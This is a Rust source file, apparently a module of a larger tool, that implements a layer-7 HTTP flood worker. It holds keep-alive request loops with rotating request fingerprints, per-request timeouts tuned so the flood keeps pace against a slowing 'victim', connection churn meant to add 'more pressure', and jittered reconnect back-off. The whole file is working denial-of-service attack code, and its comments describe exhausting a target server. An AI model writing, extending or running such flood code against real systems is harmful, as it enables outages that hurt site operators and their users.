//! HTTP flood worker (L7).
//!
//! Keep-alive request loop with zero per-request allocation: the request bytes
//! are pre-built (rotating fingerprints), and one owned read buffer is reused
//! for the lifetime of the worker. Latency is measured to response headers
//! (TTFB) — the best single-machine proxy for server-side work.

use super::net::{Conn, Target};
use super::{Governor, HeldGuard, Metrics, Shutdown};
use std::sync::atomic::Ordering::Relaxed;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};

const READ_HEADER_CAP: usize = 64 * 1024; // guard against never-ending headers
const DRAIN_REUSE_MAX: usize = 64 * 1024; // bodies larger than this → close, don't drain
// Per-request response deadline. A target we are exhausting slows to tens of
// seconds per reply; without this cap each worker blocks on one dying request
// and the flood throttles itself to the victim's rate. Abandon and recycle
// instead, which also churns fresh connections (more pressure, not less).
const REQUEST_TIMEOUT: Duration = Duration::from_secs(5);
// Base back-off after a transport failure (connect error or mid-request reset).
// Keeps a refusing/resetting target from spinning a worker into a
// millions-per-second reconnect loop that would produce junk RPS and exhaust
// our own local socket table. Grows exponentially with the failure streak
// (capped) and carries per-worker jitter to avoid a synchronized reconnect herd.
const BACKOFF_BASE_MS: u64 = 50;
const BACKOFF_MAX_MS: u64 = 2_000;

/// Capped-exponential backoff with ±50% jitter for a given consecutive-failure
/// streak. `streak` is 1 on the first failure.
fn backoff(streak: u32, rng: &mut super::raw::XorShift) -> Duration {
    let shift = streak.saturating_sub(1).min(6); // cap growth at 2^6 = 64×
    let base = BACKOFF_BASE_MS
        .saturating_mul(1u64 << shift)
        .min(BACKOFF_MAX_MS);
    // Jitter in [50%, 150%] of base.
    let jitter = base / 2 + (rng.next() % (base + 1));
    Duration::from_millis(jitter)
}

/// Bind the connection's held-count to its own lifetime.
struct Live<'a> {
    conn: Conn,
    _held: HeldGuard<'a>,
}

pub async fn worker(
    idx: u32,
    target: Arc<Target>,
    templates: Arc<[Box<[u8]>]>,
    metrics: Arc<Metrics>,
    gov: Arc<Governor>,
    shutdown: Arc<Shutdown>,
    rate_per_worker: u32,
) {
    let mut down = shutdown.subscribe();
    let mut buf: Vec<u8> = Vec::with_capacity(16 * 1024);
    let mut tmpl_i: usize = idx as usize % templates.len();
    let interval = (rate_per_worker > 0).then(|| Duration::from_secs_f64(1.0 / rate_per_worker as f64));
    let mut next_tick = tokio::time::Instant::now();
    let mut live: Option<Live> = None;
    // Backoff state: capped-exponential with per-worker jitter, so a target that
    // resets everyone at once doesn't make thousands of workers reconnect in
    // lockstep (a self-inflicted thundering herd). Reset on any progress.
    let mut rng = super::raw::XorShift::seeded(idx);
    let mut fail_streak: u32 = 0;

    loop {
        if *down.borrow() {
            break;
        }
        if !gov.active(idx) {
            live = None; // release connection while parked
            tokio::select! {
                _ = down.changed() => {}
                _ = tokio::time::sleep(Duration::from_millis(100)) => {}
            }
            continue;
        }

        // Per-worker rate pacing (O(1), no drift accumulation of work).
        if let Some(iv) = interval {
            tokio::select! {
                _ = tokio::time::sleep_until(next_tick) => {}
                _ = down.changed() => break,
            }
            next_tick += iv;
        }

        // Ensure a live connection. The connect must race the stop signal, or a
        // worker parked in it against an overwhelmed target won't observe shutdown
        // and the drain force-aborts it after the grace window (run overshoot).
        if live.is_none() {
            let conn = tokio::select! {
                r = target.connect() => match r {
                    Ok(conn) => conn,
                    Err(_) => {
                        metrics.errors.fetch_add(1, Relaxed);
                        fail_streak = fail_streak.saturating_add(1);
                        sleep_or_stop(&mut down, backoff(fail_streak, &mut rng)).await;
                        continue;
                    }
                },
                _ = down.changed() => break,
            };
            live = Some(Live {
                conn,
                _held: HeldGuard::new(&metrics.held_connections),
            });
        }

        let l = live.as_mut().unwrap();
        let req = &templates[tmpl_i];
        tmpl_i = (tmpl_i + 1) % templates.len();

        match one_request(&mut l.conn, req, &mut buf, &metrics, &mut down).await {
            Ok(true) => fail_streak = 0,   // progress: reset backoff
            Ok(false) => {
                fail_streak = 0;
                live = None; // clean close, reconnect next round
            }
            Err(()) => {
                metrics.errors.fetch_add(1, Relaxed);
                live = None;
                fail_streak = fail_streak.saturating_add(1);
                // Transport failure (RST / early close): throttle before retrying.
                // A clean keep-alive close is Ok(false) and is NOT throttled.
                sleep_or_stop(&mut down, backoff(fail_streak, &mut rng)).await;
            }
        }
    }
}

/// Send one request, read headers, drain a bounded body. Returns whether the
/// connection can be reused, or `Err` on transport failure.
async fn one_request(
    conn: &mut Conn,
    req: &[u8],
    buf: &mut Vec<u8>,
    metrics: &Metrics,
    down: &mut tokio::sync::watch::Receiver<bool>,
) -> Result<bool, ()> {
    let t0 = Instant::now();
    metrics.requests_sent.fetch_add(1, Relaxed);

    if conn.write_all(req).await.is_err() {
        return Err(());
    }
    metrics.bytes_sent.fetch_add(req.len() as u64, Relaxed);

    buf.clear();
    // Absolute deadline for the whole response read (headers + bounded drain).
    let deadline = tokio::time::Instant::now() + REQUEST_TIMEOUT;
    let (content_len, chunked, hdr_end, keep_alive) = loop {
        // Race the read against shutdown AND the per-request deadline: a target
        // that accepts the request but stalls must not pin this worker.
        let n = tokio::select! {
            r = conn.read_buf(buf) => r.map_err(|_| ())?,
            _ = tokio::time::sleep_until(deadline) => return Err(()),
            _ = down.changed() => return Err(()),
        };
        if n == 0 {
            return Err(()); // closed before we got headers
        }
        let mut headers = [httparse::EMPTY_HEADER; 48];
        let mut resp = httparse::Response::new(&mut headers);
        match resp.parse(buf) {
            Ok(httparse::Status::Complete(hdr_end)) => {
                let mut content_len = None;
                let mut chunked = false;
                let mut conn_close = false;
                let mut conn_keep = false;
                for h in resp.headers.iter() {
                    if h.name.eq_ignore_ascii_case("content-length") {
                        content_len = std::str::from_utf8(h.value)
                            .ok()
                            .and_then(|s| s.trim().parse::<usize>().ok());
                    } else if h.name.eq_ignore_ascii_case("transfer-encoding")
                        && h.value.windows(7).any(|w| w.eq_ignore_ascii_case(b"chunked"))
                    {
                        chunked = true;
                    } else if h.name.eq_ignore_ascii_case("connection") {
                        conn_close = h.value.windows(5).any(|w| w.eq_ignore_ascii_case(b"close"));
                        conn_keep =
                            h.value.windows(10).any(|w| w.eq_ignore_ascii_case(b"keep-alive"));
                    }
                }
                // HTTP/1.1 keeps alive unless told to close; 1.0 only if asked.
                let keep_alive = match resp.version.unwrap_or(0) {
                    1 => !conn_close,
                    _ => conn_keep,
                };
                metrics.record_status(resp.code.unwrap_or(0));
                break (content_len, chunked, hdr_end, keep_alive);
            }
            Ok(httparse::Status::Partial) => {
                if buf.len() > READ_HEADER_CAP {
                    return Err(());
                }
            }
            Err(_) => return Err(()),
        }
    };

    // Latency = time to full response headers.
    metrics.record_latency(t0.elapsed());
    metrics.responses_ok.fetch_add(1, Relaxed);

    // A server that won't keep the connection alive is an expected close, not an
    // error: signal a clean reconnect so it never inflates the error rate.
    if !keep_alive {
        return Ok(false);
    }

    // Reuse only when we can cleanly consume a bounded body.
    match content_len {
        Some(cl) if !chunked && cl <= DRAIN_REUSE_MAX => {
            let already = buf.len().saturating_sub(hdr_end);
            let mut remaining = cl.saturating_sub(already);
            while remaining > 0 {
                buf.clear();
                // Same deadline covers the body drain, so a slow trickle can't
                // pin the worker either.
                let n = tokio::select! {
                    r = conn.read_buf(buf) => r.map_err(|_| ())?,
                    _ = tokio::time::sleep_until(deadline) => return Err(()),
                    _ = down.changed() => return Err(()),
                };
                if n == 0 {
                    return Err(());
                }
                remaining = remaining.saturating_sub(n);
            }
            Ok(true)
        }
        _ => Ok(false), // chunked / unknown / oversized → close and reconnect
    }
}

/// Sleep, but wake immediately on shutdown.
async fn sleep_or_stop(down: &mut tokio::sync::watch::Receiver<bool>, dur: Duration) {
    tokio::select! {
        _ = tokio::time::sleep(dur) => {}
        _ = down.changed() => {}
    }
}
